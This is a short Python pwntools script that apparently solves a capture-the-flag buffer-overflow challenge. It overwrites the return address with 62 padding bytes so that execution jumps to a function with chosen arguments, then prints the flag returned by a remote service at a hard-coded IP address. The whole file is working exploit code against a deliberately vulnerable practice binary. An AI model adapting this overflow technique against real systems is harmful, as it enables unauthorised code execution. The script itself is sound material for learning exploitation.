from pwn import *


DEBUG = False

if not DEBUG:
    r = remote(
        host='103.145.226.170',
        port=3001
    )
else:
    r = process([
        'gdb', '-q',
        '/macOS/bof',
    ])

audition = 0x08049182  # Found using nm (one could use pwn.elf too)
tiime = 1200  # First parameter
room_num = 366  # Second parameter

smash_after = 62  # Can be found using pwn.cyclic
payload = b'A' * smash_after + p32(audition) + b'LOOL' + p32(tiime) + p32(room_num)

if DEBUG:
    # r.sendline('b * 0x0804921d')
    r.sendline('r')

log.info(r.recvuntil('name?\n'))
r.sendline(payload)  # When the overflow happens

log.info(r.recvuntil('ing?\n'))
r.sendline('whocares')  # We don't care about the second buffer

if DEBUG:
    r.interactive()
else:
    log.success(r.recvline().decode())  # Outputs the flag